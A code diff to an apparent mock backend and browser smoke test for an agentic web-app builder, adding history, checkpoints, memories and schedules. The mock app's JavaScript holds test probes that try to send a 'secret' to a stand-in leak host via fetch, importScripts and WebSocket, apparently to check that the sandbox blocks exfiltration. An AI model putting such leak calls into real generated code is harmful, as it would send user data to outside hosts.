@@ -41,6 +41,12 @@ RUNTIME_LABELS = {
     "claude_code": "Claude Code",
     "hermes": "Hermes",
 }
+DEMO_MODE = False
+
+
+def configure_mock(*, demo_mode: bool) -> None:
+    global DEMO_MODE
+    DEMO_MODE = demo_mode
 
 
 def _app_markup(count: int, title: str = "Weekly focus") -> str:
@@ -85,7 +91,8 @@ def _app_markup(count: int, title: str = "Weekly focus") -> str:
 
 def _empty_app() -> dict[str, Any]:
     return {
-        "revision": 0,
+        "ui_revision": 0,
+        "data_version": 0,
         "html": "",
         "css": "",
         "javascript": "",
@@ -116,14 +123,23 @@ def _built_app(title: str = "Weekly focus") -> dict[str, Any]:
       @media __LONG_MEDIA_CONDITION__ { .too-long-media { color: red; } }
       @media (max-width: 640px) { .dashboard { padding: 2rem 1rem; } }
     """.replace("__LONG_MEDIA_CONDITION__", LONG_MEDIA_CONDITION)
+    oversize_probe = "" if DEMO_MODE else f"""
+        try {{
+          app.render('x'.repeat({builder_backend.MAX_HTML_BYTES + 1}));
+        }} catch (_error) {{
+          app.notify('Oversized render rejected', 'success');
+        }}
+    """
     return {
-        "revision": 1,
+        "ui_revision": 1,
+        "data_version": 1,
         "html": html,
         "css": css,
         "javascript": f"""
       try {{ fetch('https://browser-leak.invalid/fetch?secret=worker'); }} catch (_error) {{}}
       try {{ importScripts('https://browser-leak.invalid/import?secret=worker'); }} catch (_error) {{}}
       try {{ new WebSocket('wss://browser-leak.invalid/socket?secret=worker'); }} catch (_error) {{}}
+      try {{ setTimeout(() => {{}}, 5); }} catch (_error) {{}}
       const initialMarkup = {json.dumps(html)};
       const initialCss = {json.dumps(css)};
       const renderDashboard = data => app.render(
@@ -131,11 +147,7 @@ def _built_app(title: str = "Weekly focus") -> dict[str, Any]:
         initialCss,
       );
       app.onLoad(() => {{
-        try {{
-          app.render('x'.repeat({builder_backend.MAX_HTML_BYTES + 1}));
-        }} catch (_error) {{
-          app.notify('Oversized render rejected', 'success');
-        }}
+        {oversize_probe}
         app.askAgent('{LOAD_ONLY_PROMPT}');
         renderDashboard(app.data());
       }});
@@ -208,44 +220,65 @@ def _route_app_api(
             }
         if method == "GET" and resource == "conversation/events":
             return _conversation_events(workspace, query or {})
+        if method == "GET" and resource == "instructions":
+            return copy.deepcopy(workspace["instructions"])
+        if method == "GET" and resource == "memories":
+            return _list_memories(workspace, query or {})
+        memory_match = re.fullmatch(r"memories/([^/]+)", resource)
+        if method == "GET" and memory_match:
+            return {"memory": _load_memory(workspace, builder_backend._memory_name(memory_match.group(1)))}
+        if method == "GET" and resource == "schedules":
+            return {"schedules": copy.deepcopy(workspace["schedules"])}
+        if method == "GET" and resource == "checkpoints":
+            return _list_checkpoints(workspace)
         if method == "PUT" and resource == "name":
             return {"app": _rename_app(workspace, body)}
-        if method == "POST" and resource in {"archive", "unarchive"}:
-            return {"app": _set_archived(workspace, resource == "archive")}
         if method == "POST" and resource == "stop":
             return _stop_turn(workspace)
-        if workspace["archived"]:
-            raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "app not found")
         if method == "POST" and resource == "runtime/actions":
             return _runtime_action(workspace, body)
         if method == "POST" and resource == "messages":
             return _create_message(workspace, body, requested_by="user")
         if method == "POST" and resource == "runtime/agent-requests":
             return _create_message(workspace, body, requested_by="app")
+        if method == "PUT" and resource == "instructions":
+            return _save_instructions(workspace, body)
+        if memory_match and method == "PUT":
+            return {"memory": _save_memory(workspace, builder_backend._memory_name(memory_match.group(1)), body)}
+        if memory_match and method == "DELETE":
+            name = builder_backend._memory_name(memory_match.group(1))
+            removed = workspace["memories"].pop(name, None)
+            if removed is None:
+                raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "memory not found")
+            _record_history(
+                workspace, "memory", "user",
+                {"name": name, "old": _memory_content(removed), "new": None},
+            )
+            return {"ok": True}
+        if method == "POST" and resource == "schedules":
+            return {"schedule": _create_schedule(workspace, body)}
+        if method == "POST" and resource == "checkpoints":
+            return {"checkpoint": _save_checkpoint(workspace, "manual")}
+        schedule_match = re.fullmatch(r"schedules/([1-9][0-9]{0,17})", resource)
+        if schedule_match and method == "PUT":
+            return {"schedule": _update_schedule(workspace, int(schedule_match.group(1)), body)}
+        if schedule_match and method == "DELETE":
+            return _delete_schedule(workspace, int(schedule_match.group(1)))
+        checkpoint_match = re.fullmatch(
+            r"checkpoints/([1-9][0-9]{0,17})/revert", resource
+        )
+        if method == "POST" and checkpoint_match:
+            return _revert_checkpoint(workspace, int(checkpoint_match.group(1)))
     raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "route not found")
 
 
 def _list_apps(query: dict[str, list[str]]) -> dict[str, Any]:
-    unexpected = sorted(set(query) - {"archived"})
-    if unexpected:
+    if query:
         raise builder_backend.AppError(
             HTTPStatus.BAD_REQUEST,
-            f"unexpected app query fields: {', '.join(unexpected)}",
+            f"unexpected app query fields: {', '.join(sorted(query))}",
         )
-    archived_values = query.get("archived") or []
-    if len(archived_values) > 1 or (
-        archived_values and archived_values[0] not in {"true", "false"}
-    ):
-        raise builder_backend.AppError(
-            HTTPStatus.BAD_REQUEST,
-            "archived must be true or false",
-        )
-    archived = bool(archived_values and archived_values[0] == "true")
-    apps = [
-        _app_summary(workspace)
-        for workspace in WORKSPACES.values()
-        if workspace["archived"] is archived
-    ]
+    apps = [_app_summary(workspace) for workspace in WORKSPACES.values()]
     apps.sort(key=lambda app: str(app["last_used_at"]), reverse=True)
     return {"apps": apps}
 
@@ -258,8 +291,7 @@ def _app_summary(workspace: dict[str, Any]) -> dict[str, Any]:
     return {
         "thread_id": workspace["thread_id"],
         "name": workspace["name"],
-        "archived": workspace["archived"],
-        "revision": workspace["app"]["revision"],
+        "ui_revision": workspace["app"]["ui_revision"],
         "created_at": workspace["created_at"],
         "updated_at": workspace["app"]["updated_at"],
         "last_used_at": max(workspace["app"]["updated_at"], workspace["last_used_at"]),
@@ -282,15 +314,23 @@ def _create_app() -> dict[str, Any]:
     workspace = {
         "thread_id": thread_id,
         "name": thread_id,
-        "archived": False,
         "created_at": now,
         "last_used_at": now,
         "app": app,
         "turn": None,
         "events": [],
         "session": None,
+        "instructions": {"instructions_md": "", "updated_by": "", "updated_at": ""},
+        "memories": {},
+        "schedules": [],
+        "schedule_seq": 0,
+        "history": [],
+        "history_seq": 0,
     }
     WORKSPACES[thread_id] = workspace
+    _record_history(workspace, "ui", "user", {"html": "", "css": "", "javascript": ""})
+    _record_history(workspace, "snapshot", "user", {"data": {}})
+    _save_checkpoint(workspace, "automatic")
     return _app_summary(workspace)
 
 
@@ -306,13 +346,6 @@ def _rename_app(
             f"name must be at most {builder_backend.MAX_APP_NAME_CHARS} characters",
         )
     workspace["name"] = name
-    return _app_summary(workspace)
-
-
-def _set_archived(
-    workspace: dict[str, Any], archived: bool
-) -> dict[str, Any]:
-    workspace["archived"] = archived
     return _app_summary(workspace)
 
 
@@ -372,37 +405,403 @@ def _clip_message(value: str) -> str:
     return encoded[: maximum - len(suffix)].decode(errors="ignore") + "…"
 
 
+# --- History -----------------------------------------------------------------
+
+
+def _record_history(
+    workspace: dict[str, Any], kind: str, actor: str, entry: dict[str, Any]
+) -> None:
+    workspace["history_seq"] += 1
+    workspace["history"].append(
+        {
+            "id": workspace["history_seq"],
+            "kind": kind,
+            "actor": actor,
+            "ui_revision": workspace["app"]["ui_revision"],
+            "data_version": workspace["app"]["data_version"],
+            "entry": copy.deepcopy(entry),
+            "created_at": _now(),
+        }
+    )
+
+
+def _list_history(
+    workspace: dict[str, Any], query: dict[str, list[str]]
+) -> dict[str, Any]:
+    before_values = query.get("before") or []
+    before = int(before_values[0]) if before_values else None
+    rows = [
+        entry
+        for entry in reversed(workspace["history"])
+        if before is None or entry["id"] < before
+    ]
+    page = rows[: builder_backend.HISTORY_PAGE_LIMIT]
+    entries = [
+        builder_backend._history_summary(
+            (
+                entry["id"], entry["kind"], entry["actor"], entry["ui_revision"],
+                entry["data_version"],
+                json.dumps(entry["entry"]), entry["created_at"],
+            )
+        )
+        for entry in page
+    ]
+    more = len(rows) > len(page)
+    return {"entries": entries, "next_before": page[-1]["id"] if more and page else None}
+
+
+def _checkpoint_payload(workspace: dict[str, Any], checkpoint_type: str) -> dict[str, Any]:
+    app = workspace["app"]
+    return {
+        "checkpoint_type": checkpoint_type,
+        "checkpoint_date": datetime.now(timezone.utc).date().isoformat(),
+        "name": workspace["name"],
+        "html": app["html"],
+        "css": app["css"],
+        "javascript": app["javascript"],
+        "data": copy.deepcopy(app["data"]),
+        "instructions_md": workspace["instructions"]["instructions_md"],
+        "memories": [
+            {key: memory[key] for key in ("name", "description", "body_md")}
+            for memory in sorted(workspace["memories"].values(), key=lambda item: item["name"])
+        ],
+        "schedules": [
+            {"id": schedule["id"], **_schedule_definition(schedule)}
+            for schedule in workspace["schedules"]
+        ],
+    }
+
+
+def _save_checkpoint(
+    workspace: dict[str, Any], checkpoint_type: str
+) -> dict[str, Any]:
+    payload = _checkpoint_payload(workspace, checkpoint_type)
+    existing = next(
+        (
+            entry for entry in reversed(workspace["history"])
+            if entry["kind"] == "checkpoint"
+            and entry["entry"].get("checkpoint_type") == checkpoint_type
+            and entry["entry"].get("checkpoint_date") == payload["checkpoint_date"]
+        ),
+        None,
+    )
+    if existing is None:
+        _record_history(
+            workspace, "checkpoint", "app" if checkpoint_type == "automatic" else "user",
+            payload,
+        )
+        existing = workspace["history"][-1]
+    elif checkpoint_type == "manual":
+        existing["entry"] = payload
+        existing["ui_revision"] = workspace["app"]["ui_revision"]
+        existing["data_version"] = workspace["app"]["data_version"]
+        existing["created_at"] = _now()
+    return builder_backend._history_summary(
+        (
+            existing["id"], existing["kind"], existing["actor"],
+            existing["ui_revision"], existing["data_version"],
+            json.dumps(existing["entry"]), existing["created_at"],
+        )
+    )
+
+
+def _list_checkpoints(workspace: dict[str, Any]) -> dict[str, Any]:
+    checkpoints = []
+    for entry in reversed(workspace["history"]):
+        if entry["kind"] != "checkpoint":
+            continue
+        checkpoints.append(builder_backend._history_summary(
+            (
+                entry["id"], entry["kind"], entry["actor"], entry["ui_revision"],
+                entry["data_version"], json.dumps(entry["entry"]), entry["created_at"],
+            )
+        ))
+    return {"checkpoints": checkpoints}
+
+
+def _revert_checkpoint(workspace: dict[str, Any], checkpoint_id: int) -> dict[str, Any]:
+    entry = next(
+        (
+            candidate for candidate in workspace["history"]
+            if candidate["id"] == checkpoint_id and candidate["kind"] == "checkpoint"
+        ),
+        None,
+    )
+    if entry is None:
+        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "checkpoint not found")
+    saved = copy.deepcopy(entry["entry"])
+    app = workspace["app"]
+    workspace["name"] = saved["name"]
+    app.update({
+        "html": saved["html"],
+        "css": saved["css"],
+        "javascript": saved["javascript"],
+        "data": saved["data"],
+        "ui_revision": app["ui_revision"] + 1,
+        "data_version": app["data_version"] + 1,
+        "updated_at": _now(),
+    })
+    workspace["instructions"] = {
+        "instructions_md": saved["instructions_md"],
+        "updated_by": "user",
+        "updated_at": _now(),
+    }
+    workspace["memories"] = {
+        memory["name"]: {
+            **memory, "updated_by": "user", "updated_at": _now(),
+        }
+        for memory in saved["memories"]
+    }
+    now = _now()
+    workspace["schedules"] = [{
+        **schedule,
+        "created_by": "user",
+        "last_run_at": None,
+        "next_run_at": builder_backend._format_ts(
+            builder_backend._next_cadence_run(
+                schedule["cadence"], schedule["interval_minutes"],
+                schedule["daily_time"], datetime.now(timezone.utc),
+            )
+        ),
+        "created_at": now,
+        "updated_at": now,
+    } for schedule in saved["schedules"]]
+    workspace["schedule_seq"] = max(
+        [schedule["id"] for schedule in workspace["schedules"]], default=0
+    )
+    _record_history(
+        workspace, "ui", "user",
+        {
+            "html": app["html"], "css": app["css"], "javascript": app["javascript"],
+            "restored_from": checkpoint_id,
+        },
+    )
+    _record_history(
+        workspace, "snapshot", "user",
+        {**saved, "restored_from": checkpoint_id},
+    )
+    return {"ok": True, "app": copy.deepcopy(app)}
+
+
+# --- Instructions, memories, schedules ---------------------------------------
+
+
+def _save_instructions(workspace: dict[str, Any], body: Any) -> dict[str, Any]:
+    request = builder_backend._required_object(body, "instructions request")
+    builder_backend._require_keys(request, {"instructions_md"}, required={"instructions_md"})
+    instructions = builder_backend._bounded_string(
+        request.get("instructions_md"), "instructions_md",
+        builder_backend.MAX_INSTRUCTIONS_BYTES,
+    )
+    old = workspace["instructions"]["instructions_md"]
+    workspace["instructions"] = {
+        "instructions_md": instructions,
+        "updated_by": "user",
+        "updated_at": _now(),
+    }
+    if old != instructions:
+        _record_history(
+            workspace, "instructions", "user", {"old": old, "new": instructions}
+        )
+    return copy.deepcopy(workspace["instructions"])
+
+
+def _memory_content(memory: dict[str, Any]) -> dict[str, str]:
+    return {"description": memory["description"], "body_md": memory["body_md"]}
+
+
+def _schedule_definition(schedule: dict[str, Any]) -> dict[str, Any]:
+    return {
+        key: schedule[key]
+        for key in ("name", "message", "cadence", "interval_minutes", "daily_time", "enabled")
+    }
+
+
+def _list_memories(
+    workspace: dict[str, Any], query: dict[str, list[str]]
+) -> dict[str, Any]:
+    needle = (query.get("q") or [""])[0].lower()
+    memories = [
+        {key: memory[key] for key in ("name", "description", "updated_by", "updated_at")}
+        for memory in workspace["memories"].values()
+        if not needle or needle in memory["name"].lower()
+        or needle in memory["description"].lower()
+        or needle in memory["body_md"].lower()
+    ]
+    memories.sort(key=lambda memory: (memory["updated_at"], memory["name"]), reverse=True)
+    return {"memories": memories}
+
+
+def _load_memory(workspace: dict[str, Any], name: str) -> dict[str, Any]:
+    memory = workspace["memories"].get(name)
+    if memory is None:
+        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "memory not found")
+    return copy.deepcopy(memory)
+
+
+def _save_memory(workspace: dict[str, Any], name: str, body: Any) -> dict[str, Any]:
+    request = builder_backend._required_object(body, "memory request")
+    builder_backend._require_keys(
+        request, {"description", "body_md"}, required={"description", "body_md"}
+    )
+    description = builder_backend._required_text(request.get("description"), "description")
+    body_md = builder_backend._bounded_string(
+        request.get("body_md"), "body_md", builder_backend.MAX_MEMORY_BODY_BYTES
+    )
+    old = workspace["memories"].get(name)
+    workspace["memories"][name] = {
+        "name": name,
+        "description": description,
+        "body_md": body_md,
+        "updated_by": "user",
+        "updated_at": _now(),
+    }
+    new_content = {"description": description, "body_md": body_md}
+    if old is None or _memory_content(old) != new_content:
+        _record_history(
+            workspace, "memory", "user",
+            {
+                "name": name,
+                "old": None if old is None else _memory_content(old),
+                "new": new_content,
+            },
+        )
+    return copy.deepcopy(workspace["memories"][name])
+
+
+def _create_schedule(workspace: dict[str, Any], body: Any) -> dict[str, Any]:
+    request = builder_backend._required_object(body, "schedule request")
+    builder_backend._require_keys(
+        request,
+        {"name", "message", "cadence", "interval_minutes", "daily_time", "enabled"},
+        required={"name", "message", "cadence"},
+    )
+    fields = builder_backend._validated_schedule_fields(request)
+    workspace["schedule_seq"] += 1
+    now = _now()
+    schedule = {
+        "id": workspace["schedule_seq"],
+        **fields,
+        "created_by": "user",
+        "last_run_at": None,
+        "next_run_at": builder_backend._format_ts(
+            builder_backend._next_cadence_run(
+                fields["cadence"], fields["interval_minutes"], fields["daily_time"],
+                datetime.now(timezone.utc),
+            )
+        ),
+        "created_at": now,
+        "updated_at": now,
+    }
+    workspace["schedules"].append(schedule)
+    _record_history(
+        workspace, "schedule", "user",
+        {"schedule_id": schedule["id"], "old": None, "new": _schedule_definition(schedule)},
+    )
+    return copy.deepcopy(schedule)
+
+
+def _update_schedule(
+    workspace: dict[str, Any], schedule_id: int, body: Any
+) -> dict[str, Any]:
+    request = builder_backend._required_object(body, "schedule request")
+    schedule = next(
+        (candidate for candidate in workspace["schedules"] if candidate["id"] == schedule_id),
+        None,
+    )
+    if schedule is None:
+        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "schedule not found")
+    merged = {
+        key: request.get(key, schedule[key])
+        for key in ("name", "message", "cadence", "interval_minutes", "daily_time", "enabled")
+    }
+    old = _schedule_definition(schedule)
+    schedule.update(builder_backend._validated_schedule_fields(merged))
+    schedule["updated_at"] = _now()
+    new = _schedule_definition(schedule)
+    if old != new:
+        _record_history(
+            workspace, "schedule", "user",
+            {"schedule_id": schedule["id"], "old": old, "new": new},
+        )
+    return copy.deepcopy(schedule)
+
+
+def _delete_schedule(workspace: dict[str, Any], schedule_id: int) -> dict[str, Any]:
+    removed = next(
+        (schedule for schedule in workspace["schedules"] if schedule["id"] == schedule_id),
+        None,
+    )
+    if removed is None:
+        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "schedule not found")
+    workspace["schedules"] = [
+        schedule for schedule in workspace["schedules"] if schedule["id"] != schedule_id
+    ]
+    _record_history(
+        workspace, "schedule", "user",
+        {"schedule_id": schedule_id, "old": _schedule_definition(removed), "new": None},
+    )
+    return {"ok": True}
+
+
+# --- Data actions and messages -----------------------------------------------
+
+
 def _runtime_action(
     workspace: dict[str, Any], body: Any
 ) -> dict[str, Any]:
     action = builder_backend._required_object(body, "runtime action")
     name = builder_backend._required_text(action.get("action"), "action")
-    allowed = {"action", "expected_revision", "path"}
-    required = {"action", "expected_revision", "path"}
+    allowed = {"action", "expected_data_version", "path"}
+    required = {"action", "expected_data_version", "path"}
     if name in {"set", "append"}:
         allowed.add("value")
         required.add("value")
     builder_backend._require_keys(action, allowed, required=required)
     if name not in {"set", "delete", "append"}:
-        raise builder_backend.AppError(HTTPStatus.UNPROCESSABLE_ENTITY, "unsupported runtime action")
-    revision = builder_backend._required_revision(action.get("expected_revision"))
+        raise builder_backend.AppError(HTTPStatus.UNPROCESSABLE_ENTITY, "unsupported data action")
+    version = builder_backend._required_counter(
+        action.get("expected_data_version"), "expected_data_version"
+    )
     app = workspace["app"]
-    if revision != app["revision"]:
-        raise builder_backend.AppError(HTTPStatus.CONFLICT, "app state changed; reload and retry")
+    if version != app["data_version"]:
+        raise builder_backend.AppError(HTTPStatus.CONFLICT, "app data changed; reload and retry")
     path = builder_backend._validated_path(action.get("path"))
     updated = builder_backend._mutate_data(
         copy.deepcopy(app["data"]), name, path, action.get("value")
     )
     builder_backend._validated_data(updated)
-    candidate = {
-        **app,
-        "revision": revision + 1,
-        "data": updated,
-        "updated_at": _now(),
+    app["data"] = updated
+    app["data_version"] = version + 1
+    app["updated_at"] = _now()
+    entry: dict[str, Any] = {"action": name, "path": path}
+    if name != "delete":
+        entry["value"] = action.get("value")
+    _record_history(workspace, "data", "app", entry)
+    return {
+        "app": {
+            "ui_revision": app["ui_revision"],
+            "data_version": app["data_version"],
+            "data": copy.deepcopy(updated),
+            "updated_at": app["updated_at"],
+        }
     }
-    builder_backend._require_state_response_fits(candidate)
-    workspace["app"] = candidate
-    return {"app": copy.deepcopy(candidate)}
+
+
+def _workspace_context(workspace: dict[str, Any]) -> str:
+    instructions = workspace["instructions"]["instructions_md"]
+    memories = list(workspace["memories"].values())
+    lines = [builder_backend.CONTEXT_OPEN]
+    if not instructions and not memories:
+        lines.append("(No saved instructions or memories.)")
+    elif instructions:
+        lines.append("Always-on instructions:")
+        lines.append(instructions)
+    if memories:
+        lines.append("Memory index (read a body: app_api GET /agent/memories/{name}):")
+        lines.extend(f"- {memory['name']}: {memory['description']}" for memory in memories)
+    lines.append(builder_backend.CONTEXT_CLOSE)
+    return "\n".join(lines) + "\n"
 
 
 def _create_message(
@@ -419,12 +818,13 @@ def _create_message(
         required={"content"},
     )
     prefix = builder_backend.REQUEST_PREFIXES[requested_by]
+    context = _workspace_context(workspace)
     content = builder_backend._bounded_required_text(
         request.get("content"),
         "content",
-        builder_backend.MAX_CHAT_MESSAGE_BYTES - len(f"{prefix}\n".encode()),
+        builder_backend.MAX_CHAT_MESSAGE_BYTES - len(f"{prefix}\n{context}".encode()),
     )
-    input_message = f"{prefix}\n{content}"
+    input_message = f"{prefix}\n{context}{content}"
     supplied = [field for field in config_fields if field in request]
     if supplied and len(supplied) != len(config_fields):
         raise builder_backend.AppError(
@@ -529,12 +929,13 @@ def _progress_turns() -> None:
         app = workspace["app"]
         now = _now()
         has_bundle = bool(app["html"] or app["css"] or app["javascript"])
+        agent_analysis_turn = turn["input_message"].endswith(f"\n{AGENT_PROMPT}")
         output_message = (
             "Built the dashboard with durable priorities and interactive controls."
             if not has_bundle
             else (
                 "Reviewed the current structured data and refreshed the dashboard analysis."
-                if turn["input_message"] == APP_AGENT_INPUT
+                if agent_analysis_turn
                 else "Updated the web app from this request."
             )
         )
@@ -555,16 +956,25 @@ def _progress_turns() -> None:
             built = _built_app(title)
             built["updated_at"] = now
             workspace["app"] = built
-        elif turn["input_message"] == APP_AGENT_INPUT:
+            _record_history(
+                workspace, "ui", "agent",
+                {
+                    "html": built["html"], "css": built["css"],
+                    "javascript": built["javascript"],
+                },
+            )
+            _record_history(workspace, "snapshot", "agent", {"data": built["data"]})
+        elif agent_analysis_turn:
             app["data"] = {
                 **app["data"],
                 "analysis": "Two priorities remain open; review the security item before shipping.",
             }
-            app["revision"] += 1
+            app["data_version"] += 1
             app["updated_at"] = now
-        else:
-            app["revision"] += 1
-            app["updated_at"] = now
+            _record_history(
+                workspace, "data", "agent",
+                {"action": "set", "path": ["analysis"], "value": app["data"]["analysis"]},
+            )
 
 
 def _append_turn_event(
@@ -607,26 +1017,43 @@ def desktop_smoke(page: Any) -> None:
     page.on("request", lambda request: leaked.append(request.url) if "browser-leak.invalid" in request.url else None)
     page.locator("#stable-app-tabs").get_by_role("button", name="Agentic Web App", exact=True).click()
     expect(page.locator("#panel-app-personal_web_app_builder")).to_be_visible()
+    expect(page.locator("body")).to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
+    expect(page.get_by_role("button", name="Back to host", exact=True)).to_be_visible()
     frame = page.frame_locator('iframe[title="Agentic Web App"]')
+    expect(frame.get_by_role("complementary", name="All apps", exact=True)).to_be_visible()
 
-    expect(frame.locator("#app-title")).to_have_text("Select an app")
-    expect(frame.locator(".builder-bar")).to_be_visible()
-    expect(frame.locator("#first-run-how")).to_be_hidden()
-    frame.locator("#new-app").click()
-    expect(frame.locator("#app-title")).to_have_text("app-1")
-    expect(frame.locator("#first-run-how")).to_be_visible()
-    expect(frame.locator("#first-run-guidance")).to_have_count(0)
-    expect(frame.get_by_text("Build it through Agent chat", exact=True)).to_be_visible()
-    expect(frame.get_by_text("Use the app directly", exact=True)).to_be_visible()
-    expect(frame.locator("#agent-settings-help")).to_have_count(0)
+    # Home library, then a fresh workspace that lands in the admin chat.
+    expect(frame.locator("#home-view")).to_be_visible()
+    expect(frame.locator("#home-empty")).to_be_visible()
+    center_offsets = frame.locator("#home-view").evaluate(
+        """home => {
+          const bounds = home.getBoundingClientRect();
+          const center = bounds.left + bounds.width / 2;
+          return [...home.querySelectorAll('.home-brand, .home-empty')]
+            .map(element => Math.abs(element.getBoundingClientRect().left
+              + element.getBoundingClientRect().width / 2 - center));
+        }"""
+    )
+    if any(offset > 2 for offset in center_offsets):
+        raise AssertionError(f"empty library is not centered: {center_offsets}")
+    frame.locator("#home-empty-primary").click()
+    expect(frame.locator("#admin-overlay")).to_be_visible()
+    expect(frame.locator("#admin-close")).to_be_focused()
+    expect(frame.get_by_text("App administration", exact=True)).to_be_visible()
+    expect(frame.locator("#admin-app-title")).to_have_text("app-1")
+    expect(frame.locator(".workspace-list-item.current")).to_contain_text("app-1")
+    expect(frame.get_by_role("button", name="Close all apps", exact=True)).to_be_hidden()
+    frame.locator("#admin-close").press("Escape")
+    expect(frame.locator("#admin-overlay")).to_be_hidden()
+    frame.locator("#admin-open").click()
+    expect(frame.locator("#admin-overlay")).to_be_visible()
     expect(frame.locator("#runtime")).to_have_value("codex")
     expect(frame.locator("#model")).to_have_value("gpt-5.6-terra")
     expect(frame.locator("#effort")).to_have_value("high")
     expect(frame.locator("#runtime")).to_be_enabled()
     expect(frame.locator("#model")).to_be_enabled()
     expect(frame.locator("#effort")).to_be_enabled()
-    frame.get_by_role("button", name="Start building", exact=True).click()
-    expect(frame.locator("#chat-drawer")).to_be_visible()
+
     with page.expect_file_chooser() as chooser:
         frame.get_by_role("button", name="Attach files").click()
     chooser.value.set_files({
@@ -663,10 +1090,12 @@ def desktop_smoke(page: Any) -> None:
     )
     frame.locator("#model").select_option("gpt-5.6-terra")
     expect(frame.locator("#agent-session-change-warning")).to_be_hidden()
-    expect(frame.locator("#chat-drawer select")).to_have_count(0)
     expect(frame.locator("#runtime-status")).to_have_text("Oversized render rejected")
-    frame.get_by_role("button", name="Close agent chat", exact=True).click()
-    expect(frame.locator("#chat-drawer")).to_be_hidden()
+
+    # Back to the full-screen canvas: sanitizer boundary assertions.
+    frame.get_by_role("button", name="Go to app", exact=True).click()
+    expect(frame.get_by_text("Interact with your app", exact=True)).to_be_visible()
+    expect(frame.locator("#admin-overlay")).to_be_hidden()
     expect(frame.locator(".metric strong")).to_have_text("2")
     generated = frame.locator("#generated-host")
     expect(
@@ -716,32 +1145,42 @@ def desktop_smoke(page: Any) -> None:
     expect(frame.locator("#runtime-status")).to_have_text("Review marked complete")
     page.wait_for_timeout(100)
 
-    frame.get_by_role("button", name="Add priority", exact=True).click()
+    # A data-only render patches the safe tree in place. An unrelated control
+    # keeps its live checked state and focus instead of being torn down with
+    # the whole generated interface.
+    frame.get_by_role("button", name="Add priority", exact=True).evaluate(
+        "button => button.click()"
+    )
     expect(frame.locator(".metric strong")).to_have_text("3")
+    expect(reviewed).to_be_focused()
+    expect(reviewed).to_be_checked()
 
+    # Durable rendering after a full reload: back through the home library.
     page.reload()
     expect(page.locator("#app")).to_be_visible()
     page.locator("#stable-app-tabs").get_by_role(
         "button", name="Agentic Web App", exact=True
     ).click()
-    expect(frame.locator("#app-title")).to_have_text("Select an app")
-    frame.get_by_role("button", name="app-1", exact=False).click()
+    expect(frame.locator("#home-view")).to_be_visible()
+    frame.locator(".app-card", has_text="app-1").click()
     expect(frame.locator(".metric strong")).to_have_text("3")
+    expect(frame.locator("#admin-overlay")).to_be_hidden()
 
-    frame.get_by_role("button", name="Agent chat", exact=True).click()
-    expect(frame.locator("#chat-drawer")).to_be_visible()
+    frame.locator("#admin-open").click()
+    expect(frame.locator("#admin-overlay")).to_be_visible()
     expect(frame.locator("#chat-history")).to_contain_text("Requested by user:")
     expect(frame.locator("#chat-history")).to_contain_text("Built the dashboard")
     expect(frame.locator("#chat-history")).not_to_contain_text(LOAD_ONLY_PROMPT)
     frame.locator("#message").fill("Keep this unsent human draft.")
-    frame.get_by_role("button", name="Close agent chat", exact=True).click()
-    expect(frame.locator("#chat-drawer")).to_be_hidden()
+    frame.get_by_role("button", name="Go to app", exact=True).click()
+    expect(frame.locator("#admin-overlay")).to_be_hidden()
     expect(frame.locator(".dashboard")).to_be_visible()
 
+    # A generated control starts the exact agent instruction, no dialogs.
     frame.get_by_role("button", name="Refresh analysis", exact=True).click()
     expect(frame.locator("dialog")).to_have_count(0)
     expect(frame.locator("#runtime-status")).to_have_text("Sent to agent")
-    frame.get_by_role("button", name="Agent chat", exact=True).click()
+    frame.locator("#admin-open").click()
     expect(frame.locator("#chat-history")).to_contain_text("Requested by app:")
     expect(frame.locator("#chat-history")).to_contain_text(AGENT_PROMPT)
     expect(frame.locator("#message")).to_have_value("Keep this unsent human draft.")
@@ -750,43 +1189,112 @@ def desktop_smoke(page: Any) -> None:
 
     page.once("dialog", lambda dialog: dialog.accept("Weekly focus"))
     frame.get_by_role("button", name="Rename app", exact=True).click()
-    expect(frame.locator("#app-title")).to_have_text("Weekly focus")
+    expect(frame.locator("#admin-app-title")).to_have_text("Weekly focus")
+    expect(frame.locator(".workspace-list-item.current")).to_contain_text("Weekly focus")
 
-    # A second workspace has a separate thread, bundle, data revision, and
-    # conversation. Building and switching it must not disturb the first app.
-    frame.locator("#new-app").click()
-    expect(frame.locator("#app-title")).to_have_text("app-2")
-    expect(frame.locator(".dashboard")).to_have_count(0)
-    expect(frame.locator("#revision-label")).to_have_text("Empty app")
+    # Schedules: create, see the cadence, pause.
+    frame.get_by_role("tab", name="Schedules", exact=True).click()
+    frame.locator("#schedule-name").fill("Morning review")
+    frame.locator("#schedule-message").fill("Summarize yesterday and refresh the dashboard.")
+    frame.locator("#schedule-cadence").select_option("daily")
+    frame.locator("#schedule-time").fill("09:00")
+    frame.get_by_role("button", name="Add schedule", exact=True).click()
+    schedule_card = frame.locator(".schedule-card", has_text="Morning review")
+    expect(schedule_card).to_be_visible()
+    expect(schedule_card).to_contain_text("Daily at 09:00 UTC")
+    schedule_card.get_by_role("button", name="Pause", exact=True).click()
+    expect(schedule_card).to_contain_text("Paused")
+    schedule_card.get_by_role("button", name="Resume", exact=True).click()
+    expect(schedule_card).to_contain_text("Next")
+
+    # Memory: always-on instructions and a named memory.
+    frame.get_by_role("tab", name="Memory", exact=True).click()
+    frame.locator("#instructions-editor").fill("Keep the dashboard tone friendly.")
+    frame.get_by_role("button", name="Save instructions", exact=True).click()
+    expect(frame.locator("#instructions-status")).to_have_text("Saved")
+    expect(frame.locator("#instructions-meta")).to_contain_text("you")
+    frame.get_by_role("button", name="New memory", exact=True).click()
+    frame.locator("#memory-name").fill("weekly-cadence")
+    frame.locator("#memory-description").fill("Reviews happen every Monday morning")
+    frame.locator("#memory-body").fill("The human reviews priorities on Mondays at 9am UTC.")
+    frame.get_by_role("button", name="Save memory", exact=True).click()
+    memory_item = frame.locator(".memory-item", has_text="weekly-cadence")
+    expect(memory_item).to_be_visible()
+    expect(memory_item).to_contain_text("Reviews happen every Monday morning")
+    # Topics read in place: the body expands under the row.
+    memory_item.locator("button[data-memory-toggle]").click()
+    expect(memory_item.locator(".memory-body-view")).to_contain_text("Mondays at 9am UTC")
+
+    # Save one whole-workspace recovery point, then make a mistake.
